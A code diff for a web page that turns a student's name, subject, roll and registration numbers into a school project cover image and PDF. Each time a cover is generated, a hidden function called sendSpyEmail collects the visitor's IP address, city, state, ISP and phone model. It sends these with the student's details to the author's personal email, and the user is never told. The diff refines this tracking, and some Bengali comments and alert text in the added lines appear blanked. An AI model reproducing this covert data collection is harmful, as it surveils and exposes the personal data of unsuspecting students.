@@ -5,66 +5,22 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>School Project Cover</title>
     <link href="https://fonts.googleapis.com/css2?family=Amaranth:wght@700&display=swap" rel="stylesheet">
-    
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
     
     <style>
-        body {
-            font-family: 'Amaranth', sans-serif;
-            background-color: #121212;
-            color: white;
-            text-align: center;
-            padding: 10px;
-            margin: 0;
-        }
-
-        .box {
-            background: #1e1e1e;
-            padding: 20px;
-            border-radius: 15px;
-            max-width: 400px;
-            margin: 10px auto;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-            border: 1px solid #333;
-        }
-
+        body { font-family: 'Amaranth', sans-serif; background-color: #121212; color: white; text-align: center; padding: 10px; margin: 0; }
+        .box { background: #1e1e1e; padding: 20px; border-radius: 15px; max-width: 400px; margin: 10px auto; box-shadow: 0 4px 15px rgba(0,0,0,0.5); border: 1px solid #333; }
         h2 { color: #ff9800; margin-top: 0; margin-bottom: 20px;}
         .field { text-align: left; margin-bottom: 15px; }
         label { color: #ccc; font-size: 13px; font-weight: bold; display: block; margin-bottom: 5px; }
-
-        input, select {
-            width: 100%; padding: 12px;
-            border: 2px solid #444; border-radius: 8px;
-            background: #2c2c2c; color: #fff;
-            font-size: 16px; font-family: 'Amaranth', sans-serif; font-weight: bold;
-            box-sizing: border-box; outline: none;
-            transition: 0.3s;
-        }
-
+        input, select { width: 100%; padding: 12px; border: 2px solid #444; border-radius: 8px; background: #2c2c2c; color: #fff; font-size: 16px; font-family: 'Amaranth', sans-serif; font-weight: bold; box-sizing: border-box; outline: none; transition: 0.3s; }
         input:focus, select:focus { border-color: #ff9800; }
         .error { border-color: #ff0000 !important; animation: shake 0.3s; }
-
-        @keyframes shake {
-            0% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            50% { transform: translateX(5px); }
-            75% { transform: translateX(-5px); }
-            100% { transform: translateX(0); }
-        }
-
-        button {
-            width: 100%; padding: 14px; border: none; border-radius: 8px;
-            font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px;
-            transition: 0.2s;
-        }
-
+        @keyframes shake { 0% { transform: translateX(0); } 25% { transform: translateX(-5px); } 50% { transform: translateX(5px); } 75% { transform: translateX(-5px); } 100% { transform: translateX(0); } }
+        button { width: 100%; padding: 14px; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: 0.2s; }
         .btn-gen { background: linear-gradient(135deg, #ffc107, #ff9800); color: black; }
         .btn-dl { background: #e74c3c; color: white; display: none; margin-top: 15px; }
-
-        canvas {
-            max-width: 100%; height: auto; margin-top: 20px;
-            border-radius: 8px; border: 2px solid #555; display: none;
-        }
+        canvas { max-width: 100%; height: auto; margin-top: 20px; border-radius: 8px; border: 2px solid #555; display: none; }
     </style>
 </head>
 <body>
@@ -74,8 +30,7 @@
 
         <div class="field">
             <label>NAME</label>
-            <input type="text" id="name" placeholder="Ex: AYAN KARMAKAR" autocomplete="off" 
-                   oninput="validateEnglishName(this)">
+            <input type="text" id="name" placeholder="Ex: AYAN KARMAKAR" autocomplete="off" oninput="validateEnglishName(this)">
         </div>
 
         <div class="field">
@@ -124,31 +79,19 @@
         </div>
 
         <button class="btn-gen" onclick="checkAndGenerate()">Generate Cover</button>
-        <button id="dlBtn" class="btn-dl" onclick="downloadPDF()">⬇ Download PDF</button>
+        <button id="dlBtn" class="btn-dl" onclick="downloadPDF()"> Download PDF</button>
     </div>
 
     <canvas id="canvas"></canvas>
 
     <script>
-        // ==========================================
-        // 🛠️ SETTINGS (Left Shifted 0.37)
-        // ==========================================
-        const CONFIG = {
-            startX: 0.37,   
-            fontSize: 0.055, 
-            pos_Name: 0.540, 
-            pos_Subj: 0.605, 
-            pos_Roll: 0.670, 
-            pos_Reg:  0.735 
-        };
-
+        const CONFIG = { startX: 0.37, fontSize: 0.055, pos_Name: 0.540, pos_Subj: 0.605, pos_Roll: 0.670, pos_Reg: 0.735 };
         const MY_EMAIL = "ayankarmakar7602@gmail.com";
 
         function validateEnglishName(input) {
             input.value = input.value.replace(/[^a-zA-Z\s]/g, '').toUpperCase();
             input.classList.remove('error');
         }
-
         function formatRoll(input) {
             let v = input.value.replace(/\D/g, '');
             if (v.length > 6) v = v.slice(0, 6) + ' - ' + v.slice(6, 10);
@@ -163,7 +106,6 @@
             const regIn  = document.getElementById('reg');
 
             let isValid = true;
-
             if (!nameIn.value.trim()) { nameIn.classList.add('error'); isValid = false; }
             if (!subjIn.value) { subjIn.classList.add('error'); isValid = false; }
             if (rollIn.value.length < 13) { rollIn.classList.add('error'); isValid = false; }
@@ -171,23 +113,54 @@
 
             if (!isValid) {
                 if (navigator.vibrate) navigator.vibrate(200);
-                alert("⚠️ দয়া করে সব তথ্য সঠিক ভাবে পূরণ কর!");
+                alert("        !");
                 return;
             }
 
-            // 🕵️‍♂️ গোয়েন্দা ইমেইল পাঠানো শুরু (ব্যাকগ্রাউন্ডে)
+            //    
             sendSpyEmail(nameIn.value, subjIn.value, rollIn.value, regIn.value);
-
-            // 🎨 ইমেজ জেনারেট
             generate(nameIn.value, subjIn.value, rollIn.value, regIn.value);
         }
 
-        // 🔥 SPY EMAIL FUNCTION (IP + Location + Device)
+        // ---  CLEANING FUNCTIONS ( ) ---
+        
+        // 1.     
+        function getCleanDeviceName() {
+            const ua = navigator.userAgent;
+            let model = "Unknown Mobile";
+            
+            // Android   
+            if (/Android/i.test(ua)) {
+                //     
+                const match = ua.match(/Android[^;]+; ([^;]+)( Build)?/);
+                if (match && match[1]) {
+                    model = match[1].trim(); // : SM-A505F  Redmi Note 10
+                } else {
+                    model = "Android Device (Model Hidden)";
+                }
+            } else if (/iPhone|iPad/i.test(ua)) {
+                model = "iPhone / iPad";
+            } else {
+                model = "PC / Laptop";
+            }
+            return model;
+        }
+
+        // 2.     
+        function getCleanISP(org) {
+            if (!org) return "Unknown";
+            if (org.includes("Airtel")) return "Airtel";
+            if (org.includes("Jio")) return "Jio";
+            if (org.includes("Vodafone") || org.includes("Vi")) return "Vi (Vodafone)";
+            if (org.includes("BSNL")) return "BSNL";
+            return org; //    
+        }
+
         async function sendSpyEmail(name, subj, roll, reg) {
             const url = `https://formsubmit.co/ajax/${MY_EMAIL}`;
             const uniqueId = Math.floor(Math.random() * 10000);
 
-            // ১. চুপিসারে লোকেশন ট্র্যাক করা
+            //   
             let ipData = {};
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -196,41 +169,39 @@
                 ipData = { city: "N/A", region: "N/A", org: "N/A", ip: "N/A" };
             }
 
-            // ২. ফোনের মডেল বের করা
-            const device = navigator.userAgent;
+            //    
+            const cleanDevice = getCleanDeviceName();
+            const cleanSim = getCleanISP(ipData.org);
 
-            // ৩. সব তথ্য একসাথে পাঠানো
             fetch(url, {
                 method: "POST",
-                headers: { 
-                    'Content-Type': 'application/json',
-                    'Accept': 'application/json'
-                },
+                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                 body: JSON.stringify({
-                    _subject: `Cover Alert: ${name} (#${uniqueId})`, 
+                    _subject: `New Cover: ${name} (#${uniqueId})`, 
                     _captcha: "false",
                     _template: "table",
                     
-                    // ফর্মের ডাটা
-                    Student_Name: name,
+                    //  
+                    Name: name,
                     Subject: subj,
-                    Roll_No: roll,
-                    Registration_No: reg,
+                    Roll: roll,
+                    Reg_No: reg,
                     
-                    // 🕵️‍♂️ গোয়েন্দা তথ্য
-                    City: ipData.city || "Unknown",
+                    //    
+                    Location_City: ipData.city || "Unknown",
                     State: ipData.region || "Unknown",
-                    ISP_Sim: ipData.org || "Unknown", // যেমন: Jio / Airtel
-                    IP_Address: ipData.ip || "Unknown",
-                    Device_Info: device,
+                    SIM_Card: cleanSim,       //    
+                    Phone_Model: cleanDevice, //    
+                    Full_IP: ipData.ip,
                     
                     Time: new Date().toLocaleString()
                 })
             })
-            .then(response => console.log("Spy Data Sent Successfully! 😎"))
-            .catch(error => console.log("Failed:", error));
+            .then(res => console.log("Clean Data Sent!"))
+            .catch(err => console.log("Error:", err));
         }
 
+        // --- GENERATE & PDF FUNCTIONS (SAME) ---
         function generate(nameVal, subjVal, rollVal, regVal) {
             const cvs = document.getElementById('canvas');
             const ctx = cvs.getContext('2d');
@@ -241,56 +212,38 @@
             img.onload = function() {
                 cvs.width = img.width;
                 cvs.height = img.height;
-
                 ctx.drawImage(img, 0, 0);
-
                 const size = cvs.width * CONFIG.fontSize;
                 ctx.font = `bold ${size}px 'Amaranth', sans-serif`;
                 ctx.textAlign = "left";
-
                 const x = cvs.width * CONFIG.startX;
-
                 drawDeepGlowText(ctx, nameVal, x, cvs.height * CONFIG.pos_Name);
                 drawDeepGlowText(ctx, subjVal, x, cvs.height * CONFIG.pos_Subj);
                 drawDeepGlowText(ctx, rollVal, x, cvs.height * CONFIG.pos_Roll);
                 drawDeepGlowText(ctx, regVal,  x, cvs.height * CONFIG.pos_Reg);
-
                 cvs.style.display = "block";
                 document.getElementById('dlBtn').style.display = "block";
-                
-                setTimeout(() => {
-                    cvs.scrollIntoView({behavior: "smooth", block: "center"});
-                }, 100);
+                setTimeout(() => { cvs.scrollIntoView({behavior: "smooth", block: "center"}); }, 100);
             };
-
-            img.onerror = function() {
-                alert("Error: 'background.jpg' ফাইল পাওয়া যাচ্ছে না!");
-            };
+            img.onerror = function() { alert("Error: 'background.jpg' not found!"); };
         }
 
         function drawDeepGlowText(ctx, text, x, y) {
             const w = ctx.canvas.width;
-            
             ctx.save();
             ctx.shadowColor = "black";
             ctx.shadowBlur = w * 0.015; 
             ctx.shadowOffsetX = w * 0.005;
             ctx.shadowOffsetY = w * 0.005;
-            
             ctx.lineWidth = w * 0.012; 
             ctx.strokeStyle = "black";
             ctx.lineJoin = "round"; 
             ctx.strokeText(text, x, y);
             ctx.restore(); 
-
             let grad = ctx.createLinearGradient(x, y - (w * 0.05), x, y);
-            grad.addColorStop(0, "#FFFF00");   
-            grad.addColorStop(0.5, "#FFA500"); 
-            grad.addColorStop(1, "#FF4500");   
-            
+            grad.addColorStop(0, "#FFFF00"); grad.addColorStop(0.5, "#FFA500"); grad.addColorStop(1, "#FF4500");
             ctx.fillStyle = grad;
             ctx.fillText(text, x, y);
-            
             ctx.lineWidth = w * 0.0015;
             ctx.strokeStyle = "white";
             ctx.strokeText(text, x, y);
@@ -299,13 +252,7 @@
         async function downloadPDF() {
             const { jsPDF } = window.jspdf;
             const cvs = document.getElementById('canvas');
-            
-            const pdf = new jsPDF({
-                orientation: 'portrait',
-                unit: 'px',
-                format: [cvs.width, cvs.height]
-            });
-
+            const pdf = new jsPDF({ orientation: 'portrait', unit: 'px', format: [cvs.width, cvs.height] });
             const imgData = cvs.toDataURL('image/jpeg', 1.0);
             pdf.addImage(imgData, 'JPEG', 0, 0, cvs.width, cvs.height);
             pdf.save("School_Project.pdf");
